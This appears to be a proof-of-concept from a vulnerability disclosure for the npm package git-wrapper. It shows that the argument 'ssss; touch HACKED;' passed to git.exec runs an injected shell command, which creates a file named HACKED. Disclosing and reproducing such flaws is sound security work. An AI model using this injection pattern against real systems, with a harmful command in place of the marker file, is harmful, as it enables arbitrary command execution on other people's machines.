1. Create the following PoC file:

```js
// poc.js
var Git = require("git-wrapper");
var git = new Git();
git.exec("ssss; touch HACKED;", [], function (err, s) {});
```

2. Check there aren't files called `HACKED`
3. Execute the following commands in another terminal:

```bash
npm i git-wrapper # Install affected module
node poc.js #  Run the PoC
```

4. Recheck the files: now `HACKED` has been created
